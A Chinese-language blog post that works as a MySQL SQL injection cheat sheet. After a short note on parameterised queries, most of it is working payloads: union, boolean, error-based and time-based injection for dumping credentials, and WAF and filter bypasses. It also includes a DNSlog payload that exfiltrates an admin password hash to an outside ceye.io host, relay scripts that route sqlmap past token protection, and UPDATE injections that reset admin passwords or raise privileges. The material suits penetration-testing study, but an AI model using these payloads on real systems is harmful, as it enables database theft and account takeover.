---
title: SQL注入漏洞
date: 2020-1-22 20:10:00
---

# SQL注入漏洞基本原理

Web应用程序对用户输入的数据校验处理不严或者根本没有校验，致使用户可以拼接执行SQL命令。

可能导致数据泄露或数据破坏，缺乏可审计性，甚至导致完全接管主机。

**根据注入技术分类有以下五种：**

> 布尔型盲注：根据返回页面判断条件真假
>
> 时间型盲注：用页面返回时间是否增加判断是否存在注入
>
> 基于错误的注入：页面会返回错误信息
>
> 联合查询注入：可以使用union的情况下
>
> 堆查询注入：可以同时执行多条语句

## 防御方法

使用参数化查询。

数据库服务器不会把参数的内容当作`SQL`指令的一部分来拼接执行；

而是在数据库完成`SQL`指令的编译后才套用参数运行(预编译)。

避免数据变成代码被执行，时刻分清代码和数据的界限。

# MySQL基础知识

> **MySQL默认的数据库有**
>
> sys、mysql、performance_schema、information_schema；

**information_schema存放着所有的数据库信息(5.0版本以上才有这个库)**

这个库有三个表：

> - **SCHEMATA**	该表存放用户创建的所有数据库库名
>   - **SCHEMA_NAME 字段**记录数据库库名
> - **TABLES**     该表存放用户创建的所有数据库库名和表名
>   - **TABLE_SCHEMA 字段**记录数据库名
>   - **TABLE_NAME 字段**记录表名
> - **COLUMNS**     该表存放用户创建的所有数据库库名、表名和字段名
>   - **TABLE_SCHEMA 字段**记录数据库名
>   - **TABLE_NAME 字段**记录表名
>   - **COLUMN_NAME 字段**记录字段名

# 查找SQL注入漏洞

## Union注入

以MySQL注入为例

**1、在参数后添加引号尝试报错，并用`and 1=1#`和`and 1=2#`测试报错**

```sql
?id=1' and 1=1#		页面返回正常
?id=1' and 1=2#		页面返回不正常
```

**2、利用`order by`猜测字段**

```sql
?id=1%27%20order%0aby%0c2%23	--返回正常
--上边用%0a和%0c的URL编码可以代替空格，到数据库后就是空格的意思
?id=1%27 order by 3#			--返回正常
?id=1%27 order by 4#			--返回正常
?id=1%27 order by 5#			--返回错误

--这就证明字段总数为4
```

**3、利用union联合查询**

```sql
?id=-1%27 union select 1,2,3,4#		--看哪个字段可以显示信息，利用它获取数据库信息
--修改id为一个不存在的id，强行报错
--因为代码默认只返回第一条结果，不会返回 union select 的结果
```

**4、获取数据库信息**

```sql
id=-1%27 union select 1,2,3,CONCAT_WS(CHAR(32,58,32),user(),database(),version())#

user()		--获取数据库用户名
database()	--获取数据库名
version()	--获取数据库版本信息
concat_ws(separator,str1,str2,...)	--含有分隔符地连接字符串 
--里边这的separator分隔符，用 char() 函数把 空格:空格 的ASCII码输出

--其它信息
@@datadir				--数据库路径
@@version_compile_os	--操作系统版本
```

**5、查询数据库的表**

```sql
id=-1%27 union select 1,2,3,table_name from information_schema.tables where table_schema='sqli' limit 0,1#

--table_schema=数据库名16进制或者用单引号括起来
--改变limit 0,1中前一个参数，得到所有表
```

**6、查询数据库字段**

```sql
id=-1%27 union select 1,2,3,column_name from information_schema.columns where table_schema=%27数据库名%27 and table_name=%27表名%27limit 0,1#
```

**7、脱裤，获取数据**

```sql
union select 1,2,3,group_concat(name,password)%20from%20sc#
--用字段名从表中取数据
group_concat(str1,str2,...)	--连接一个组的所有字符串
```

## Boolean注入

布尔型盲注，页面不返回查询信息的数据，只能通过页面返回信息的真假条件判断是否存在注入。

**1、在参数后添加引号尝试报错，并用`and 1=1#`和`and 1=2#`测试报错**

```sql
?id=1' and 1=1#		页面返回正常
?id=1' and 1=2#		页面返回不正常
```

**2、判断数据库名的长度**

```sql
1'and length(database())>=1--+		页面返回正常
1'and length(database())>=13--+		页面返回正常
1'and length(database())>=14--+		页面返回错误

由此判断得到数据库名的长度是13个字符
```

**3、猜解数据库名**

使用逐字符判断的方式获取数据库名；

数据库名的范围一般在a~z、0~9之内，可能还会有特殊字符 "_"、"-" 等，这里的字母不区分大小写。

```sql
' and substr(database(),1,1)='a'--+
' and substr(database(),2,1)='a'--+

substr 的用法和 limit 有区别，limit从 0 开始排序，这里从 1 开始排序。
```

用Burp爆破字母a的位置，即可得到数据库名每个位置上的字符。

**还可以用ASCII码查询**

a 的ASCII码是97，在MySQL中使用ord函数转换ASCII，所以逐字符判断语句可改为：

```sql
' and ord(substr(database(),1,1))=97--+
```

ASCII码表中可显示字符的范围是：0~127

**4、判断数据库表名**

```sql
' and substr((select table_name from information_schema.tables where table_schema='数据库名' limit 0,1),1,1)='a'--+

--修改1,1前边的1~20，逐字符猜解出第一个表的名
--修改limit的0,1前边的0~20，逐个猜解每个表
```

**5、判断数据库字段名**

```sql
' and substr((select column_name from information_schema.columns where table_schema='数据库名' and table_name='表名' limit 0,1),1,1)='a'--+

--修改1,1前边的1~20，逐字符猜解出第一个字段的名
--修改limit的0,1前边的0~20，逐个猜解每个字段
```

**6、取数据**

```sql
' and substr((select 字段名 from 表名 limit 0,1),1,1)='a'--+
```

当然如果嫌用Burp慢的话，可以自己编写脚本，修改payload就行了

一般盲注的话都是自己写脚本比较快。

## 报错注入

在SQL注入攻击过程中，服务器开启了错误回显，页面会返回错误信息，利用**报错函数**获取数据库数据。

常用的MySQL报错函数

```sql
--xpath语法错误
extractvalue()	--查询节点内容
updatexml()		--修改查询到的内容
它们的第二个参数都要求是符合xpath语法的字符串
如果不满足要求则会报错，并且将查询结果放在报错信息里

--主键重复（duplicate entry）
floor()			--返回小于等于该值的最大整数
只要是count，rand()，group by 三个连用就会造成这种主键重复报错
```

**1、尝试用单引号报错**

**2、获取数据库名**

```sql
' and updatexml(1,concat(0x7e,(select database()),0x7e),1)--+


--0x7e是"~"符号的16进制，在这作为分隔符
```

**3、获取表名**

```sql
' and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema='数据库名' limit 0,1),0x7e),1)--+
```

**4、获取字段名**

```sql
' and updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_schema='数据库名' and table_name='表名' limit 0,1),0x7e),1)--+
```

**5、取数据**

```sql
' and updatexml(1,concat(0x7e,(select concat(username,0x3a,password) from users limit 0,1),0x7e),1)--+
```

其它函数payload语法：

```sql
--extractvalue
' and extractvalue(1,concat(0x7e,(select database()),0x7e))--+

--floor()
' and (select 1 from (select count(*),concat(database(),floor(rand(0)*2))x from information_schema.tables group by x)a)--+
```



## 时间型盲注

盲注是在SQL注入攻击过程中，服务器关闭了错误回显，单纯通过服务器返回内容的变化来判断是否存在SQL注入的方式 。

可以用benchmark，sleep等造成延时效果的函数。

如果benkchmark和sleep关键字被过滤了，可以让两个非常大的数据表做[笛卡尔积](https://blog.csdn.net/qq_32763643/article/details/79187931)产生大量的计算从而产生时间延迟；

或者利用复杂的正则表达式去匹配一个超长字符串来产生时间延迟。

**1、利用sleep判断数据库名长度**

```sql
' and sleep(5) and 1=1--+	页面返回不正常，延时5秒
' and sleep(5) and 1=2--+	页面返回不正常，不延时

and if(length(database())>1,sleep(5),1)
--if(条件表达式，真，假) --C语言的三目运算符类似
```

**2、获取数据库名**

```sql
and if(substr(database(),1,1)='a',sleep(5),1)--+
```

具体数据以此类推即可。

### 时间型盲注的加速方式

**1、Windows平台上的Mysql可以用DNSlog加速注入**

**2、利用二分查找法**

sqlmap盲注默认采用的是二分查找法 

> - 利用 ASCII 码作为条件来查询，ASCII 码中字母范围在65~122之间
>- 以这个范围的中间数为条件，判断payload中传入的 ASCII 码是否大于这个中间数
> - 如果大于，就往中间数~122这块查找。反之亦然~ 
>

# 注入技巧

## DNSlog盲注详解

DNS在解析的时候会留下日志，通过读取多级域名的解析日志，获取请求信息；

DNSlog就是记录用户访问网站域名时，记录`DNS`和对应的IP的转换访问日志；

MySQL Load_File()函数可以发起请求，使用Dnslog接收请求，获取数据；

通过SQL执行后，将内容输出到DNSlog中记录起来，然后我们可以在DNSlog平台查询回显数据

```sql
union select 1,2,load_file(CONCAT('\\',(SELECT hex(pass) FROM user WHERE name='admin' LIMIT 1),'.mysql.wintrysec.ceye.io\abc'))

--Hex编码的目的是减少干扰，域名有一定的规范，有些特殊字符不能带入
```

> 注意：load_file()只能在windows平台上才能发起请求，linux下做dnslog攻击是不行的
>
> 因为UNC通用命名规范， \\\server\share_name 
>
> 上边 CONCAT 应该写四个反斜杠 \，因为最后会被转义成两个
>
> 因为Linux没有遵守UNC，所以当MySQL处于Linux系统中的时候，是不能使用这种方式外带数据的

> MySQL数据库配置中要设置secure_file_priv为空,才能完整的去请求DNS
>
> secure-file-priv参数是用来限制 LOAD DATA, SELECT ... OUTFILE, and LOAD_FILE()传到哪个指定目录的
>
> - ure_file_priv的值为null ，表示限制mysqld 不允许导入|导出
> - 当secure_file_priv的值为/tmp/ ，表示限制mysqld 的导入|导出只能发生在/tmp/目录下
> - 当secure_file_priv的值没有具体值时，表示不对mysqld 的导入|导出做限制

在时间型盲注中用DNSlog加速注入

```sql
'and if((SELECT LOAD_FILE(CONCAT('\\\\',(SELECT hex(database())),'.xxx.ceye.io\\abc'))),sleep(5),1)%23
```

[DNSlog在SQL注入中的实战](https://www.anquanke.com/post/id/98096)

## 宽字节注入(过滤了单引号)

> 在数据库中使用了宽字符集(GBK，GB2312等)，除了英文都是一个字符占两字节；
>
> MySQL在使用GBK编码的时候，会认为两个字符为一个汉字(ascii>128才能达到汉字范围)；
>
> 在PHP中使用`addslashes`函数的时候，会对单引号%27进行转义，在前边加一个反斜杠”\”，变成%5c%27;
>
> 可以在前边添加%df,形成%df%5c%27，而数据进入数据库中时前边的%df%5c两字节会被当成一个汉字;
>
> %5c被吃掉了，单引号由此逃逸可以用来闭合语句。

使用PHP函数`iconv('utf-8','gbk',$_GET['id'])`,也可能导致注入产生 

**修复建议：**

> （1）使用mysqli_set_charset(GBK)指定字符集
>
> （2）使用mysqli_real_escape_string进行转义

## 二阶注入

> 当数据首次插入到数据库中时，许多应用程序能够安全处理这些数据；addslashes() 等字符转义函数。
>
> 一旦数据存储在数据库中，随后应用程序本身或其它后端进程可能会以危险的方式处理这些数据。
>
> 许多这类应用并不像面向因特网的主要应用程序一样安全，却拥有较高权限的数据库账户。

第一次HTTP请求是精心构造的，为第二次HTTP请求触发漏洞做准备。

[使用Burp和自定义Sqlmap Tamper利用二次注入漏洞](https://www.freebuf.com/articles/web/142963.html)

## 中转注入

> 当网站做了token保护或js前端加密的情况下；
>
> 对于这些站点当手工发现了注入点，但并不适用于用sqlmap等工具跑，可以做中转注入；
>
> 本地起个Server，然后用sqlmap扫这个server，Server接收到payload后加到表单中提交。

**Python+selenium做中转注入**

```python
from flask import Flask
from flask import request
from selenium import webdriver
driver_path = "C:/Users/Administrator/AppData/Local/Programs/Python/Python37/Lib/site-packages/selenium/webdriver/chrome/chromedriver.exe"
chrome = webdriver.Chrome(driver_path)
chrome.get("http://127.0.0.1")#目标注入点
app = Flask(__name__)

def send(payload):
#起到中转payload效果。
  chrome.find_element_by_id("username").send_keys(payload) #把payload填到有注入点的地方
  chrome.find_element_by_id("password").send_keys("aaaa")
  chrome.find_element_by_id("submit").click()
  return "plase see flask server!" #随便返回一下不重要

@app.route('/')
def index():
    # 接收sqlmap传递过来的payload
    payload = request.args.get("payload")
    return send(payload)

if __name__ == "__main__":
    app.run()
```

**用PHP做中转注入**

```php
<?php
//先开启php.ini 中的extension=php_curl.dll
set_time_limit(1);
$curl = curl_init();//初始化curl
$id = $_GET['id'];
//替换id空格和=
$id = str_replace(" ","%20",$id);
$id = str_replace("=","%3D",$id);
$url = "http://xxx.com/aaa.php";
// 设置目标URL  
curl_setopt($curl, CURLOPT_URL, $url);     
// 设置header   
curl_setopt($curl, CURLOPT_HEADER, 0);    
// 设置cURL 参数，要求结果保存到字符串中还是输出到屏幕上。   
curl_setopt($curl, CURLOPT_RETURNTRANSFER, 0);    
// 运行cURL，请求网页   
$data = curl_exec($curl);   
// 关闭URL请求   
curl_close($curl);
?>
```

**sqlmap不能忽略证书，跑不了https的网站** 

```php
<?php
$url = "https://x.x.x.x/aaa.php";
$sql = $_GET[arg];
$s = urlencode($sql);
$params = "email=$s&password=aa";

//写出到文件分析.
$fp=fopen('result.txt','a');
fwrite($fp,'Params:'.$params."\n");
fclose($fp);

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE); // https请求 不验证证书和hosts
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, FALSE);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); 
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:70.0) Gecko/20100101 Firefox/70.0');
curl_setopt($ch, CURLOPT_TIMEOUT, 15);
  
curl_setopt($ch, CURLOPT_POST, 1);    // post 提交方式
curl_setopt($ch, CURLOPT_POSTFIELDS, $params);
  
$output = curl_exec($ch);
curl_close($ch);
$a = strlen($output);

if($a==2846){
    echo "1";
}else{
    echo "2";
}
```

## Base64变形注入

```http
http://xxx.com/?id=MQ==		只加密参数
http://xxx.com/?aWQ9MQ==	连参数名一起加密了
```

**只加密参数，用sqlmap的脚本就行**

```bash
sqlmap -u http://xxx.com/?id=MQ== --tamper base64encode.py --dbs
```

**参数名也加密了，用中转注入**

```php
//trans_sqli.php
<?php
	$id=base64_encode("id=".$_GET['id']);
	echo file_get_contents("http://xxx.com/sqli.php?{$id}");	//sqli.php是原网页
?>
```

```bash
sqlmap-u "http://127.0.0.1/trans_sqli.php?id=12" -v3 --dbs
```

## 过滤了逗号怎么办

**盲注的时候**

```sql
LIMIT M OFFSET N	
--这里的 M 是最大回显限度，N是偏移量
--与limit N,M 有相同效果

' and ascii(substr((select database()),1,1))=xxx#
--可变为
' and ascii(substr((select database())from 1 for 1))=xxx#

```

**union联合查询注入时**

```sql
union select 1,2,3
union select * from ((select 1)a JOIN (select 2)b JOIN (select 3)c)%23

union select * from ((select 1)a JOIN (select 2)b JOIN (select CONCAT_WS(CHAR(32,58,32),user(),database(),version()))c)%23
```

## Between And代替 ">" 尖括号

在`sqlmap`中使用between and 代替其它字符加上 `--tamper=between` 即可

**判断条件真假**

```sql
2 > 1   #真
0 > 1   #假
#以下用between and 实现判断真假
2 between 1 and 3   #真
3 betwwen 1 and 2   #假
```

`between and`还支持16进制,所以可以用16进制,来绕过单引号的过滤

```sql
select database() between 0x61 and 0x7a;    //select database() between 'a' and 'z';
```

## 未知列名情况下的注入利用

`mysql`版本<5.0或在利用`SQL`注入的时候遇到了WAF；

安全狗3.5版本会直接拦截关键字`information_shema`；

从而无法获取数据表的列名，这时可以**利用虚表获取数据**。

```sql
-1 union select 1,(select `4` from (select 1,2,3,4,5,6 union select * from users)a limit 1,1);
--可以通过不停的修改列名1，2，3，4来提取数据( 改这个用反引号包裹的`4`)
```

[参考](https://nosec.org/home/detail/2245.html)

# Order-By注入

> order by 注入是`SQL`注入中很常见的，被过滤的概率小；
>
> 可被用户控制的数据在order by 子句后边，即order参数可控。

### 利用报错

#### 利用regexp

```sql
http://192.168.239.2:81/?order=(select+1+regexp+if(1=1,1,0x00)) 正常
http://192.168.239.2:81/?order=(select+1+regexp+if(1=2,1,0x00)) 错误
```

#### 利用updatexml

```sql
http://192.168.239.2:81/?order=updatexml(1,if(1=1,1,user()),1)  正确
http://192.168.239.2:81/?order=updatexml(1,if(1=2,1,user()),1)  错误
```

#### 利用extractvalue

```sql
http://192.168.239.2:81/?order=extractvalue(1,if(1=1,1,user())) 正确
http://192.168.239.2:81/?order=extractvalue(1,if(1=2,1,user())) 错误
```

### 利用时间盲注

```sql
/?order=if(1=1,1,(SELECT(1)FROM(SELECT(SLEEP(2)))test)) 正常响应时间
/?order=if(1=2,1,(SELECT(1)FROM(SELECT(SLEEP(2)))test)) sleep 2秒
```

### 数据猜解

以猜解user()即`root@localhost`为例子，由于只能一位一位猜解；

可以利用`SUBSTR`,`SUBSTRING`,`MID`,以及`left`和`right`可以精准分割出每一位子串；

然后就是比较操作了可以利用`=`,`like`,`regexp`等；

这里要注意`like`是不区分大小写；

通过以下可以得知user()第一位为`r`,ascii码的16进制为0x72

```sql
http://192.168.239.2:81/?order=(select+1+regexp+if(substring(user(),1,1)=0x72,1,0x00)) 正确
http://192.168.239.2:81/?order=(select+1+regexp+if(substring(user(),1,1)=0x71,1,0x00)) 错误
```

**猜解当前数据的表名**

```sql
/?order=(select+1+regexp+if(substring((select+concat(table_name)from+information_schema.tables+where+table_schema%3ddatabase()+limit+0,1),1,1)=0x67,1,0x00))  正确
/?order=(select+1+regexp+if(substring((select+concat(table_name)from+information_schema.tables+where+table_schema%3ddatabase()+limit+0,1),1,1)=0x66,1,0x00)) 错误
```

**猜解指定表名中的列名**

```sql
/?order=(select+1+regexp+if(substring((select+concat(column_name)from+information_schema.columns+where+table_schema%3ddatabase()+and+table_name%3d0x676f6f6473+limit+0,1),1,1)=0x69,1,0x00)) 正常
/?order=(select+1+regexp+if(substring((select+concat(column_name)from+information_schema.columns+where+table_schema%3ddatabase()+and+table_name%3d0x676f6f6473+limit+0,1),1,1)=0x68,1,0x00)) 错误
```

然后结合Burp去猜解即可~（[参考](https://www.cnblogs.com/icez/p/Mysql-Order-By-Injection-Summary.html)）

知道了原理，用Burp去猜解即可

# limit 注入

**先科普下limit的用法**

```sql
格式：
limit m,n
--m是记录开始的位置，n是取n条数据
limit 0,1
--从第一条开始，取一条数据
```

(适用于5.0.0<mysql<5.6.6的版本)

```sql
SELECT field FROM table WHERE id > 0 ORDER BY id LIMIT （注入点）
```

确认有注入点前面有 order by 关键字,没法用union

在LIMIT后面可以跟两个函数，PROCEDURE 和 INTO，INTO除非有写入shell的权限，否则是无法利用的;

**报错注入：**

```sql
?id=1 procedure analyse(extractvalue(rand(),concat(0x7e,database())),1); 
```

**时间型盲注：**

直接使用sleep不行，需要用BENCHMARK代替 

```sql
?id=1 PROCEDURE analyse((select extractvalue(rand(),concat(0x7e,(IF(MID(database(),1,1) LIKE 5, BENCHMARK(5000000,SHA1(1)),1))))),1)
```

# SQL里面只有update怎么利用？

这种方式会修改数据，很危险，在授权测试允许的情况下才考虑

一般在用户修改密码的地方

先理解这句 `SQL`

```sql
UPDATE user SET password='MD5($password)', homepage='$homepage' WHERE id='$id'
```

如果此 `SQL` 被修改成以下形式，就实现了注入

**1、修改 homepage 值为`http://baidu.com', userlevel='3`**

之后 SQL 语句变为

```sql
UPDATE user SET password='mypass', homepage='http://baidu.com', userlevel='3' WHERE id='$id'
```

`userlevel` 为用户级别

**2、修改 password 值为`mypass)' WHERE username='admin'#`**

之后 `SQL` 语句变为

```sql
UPDATE user SET password='MD5(mypass)' WHERE username='admin'#)', homepage='$homepage' WHERE id='$id'
```

**3、修改 id 值为`' OR username='admin'`**
 之后 `SQL` 语句变为

```sql
UPDATE user SET password='MD5($password)', homepage='$homepage' WHERE id='' OR username='admin'
```

# 其它数据库参考

[MSSQL 注入攻击与防御](https://www.anquanke.com/post/id/86011)

[Orcle注入](https://www.tr0y.wang/2019/04/16/Oracle%E6%B3%A8%E5%85%A5%E6%8C%87%E5%8C%97/index.html)

